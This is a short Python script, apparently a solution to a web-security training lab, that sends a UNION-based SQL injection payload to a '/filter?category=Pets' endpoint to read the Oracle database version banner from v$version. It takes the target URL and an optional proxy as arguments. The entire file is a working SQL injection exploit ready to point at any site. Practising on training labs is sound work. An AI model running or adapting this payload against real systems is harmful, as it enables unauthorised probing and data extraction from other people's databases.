#!/usr/bin/python3
import requests
import sys
import urllib3
import argparse
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli_dbms_version(url):
    path = '/filter?category=Pets'
    sqli_payload = "' UNION SELECT 'test', banner FROM v$version--"
    r = requests.get(url+path+sqli_payload,verify=False,proxies=proxies)
    response = r.text
    if 'Oracle' in response:
        print(f"[V] Found the DBMS version.")
        soup = BeautifulSoup(r.text, 'html.parser')
        dbms_version = soup.find(string=re.compile('.*Oracle Database.*'))
        print("[V] The dbms version is '%s'" %dbms_version)
        return True
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL injection attack, querying the database type and version on Oracle")
    parser.add_argument("-u", "--url", help="Target URL(e.g., https://example)")
    parser.add_argument("--proxy", help="Proxy URL (e.g.,http://127.0.0.1:8080)", default=None)

    args = parser.parse_args()
    proxies =None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        print(f"[*] Using Proxy: {args.proxy}")
    
    print("[*] Retrieve dbms version...")
    if not exploit_sqli_dbms_version(args.url.strip()):
        print("[X] Did not find and dbms version")
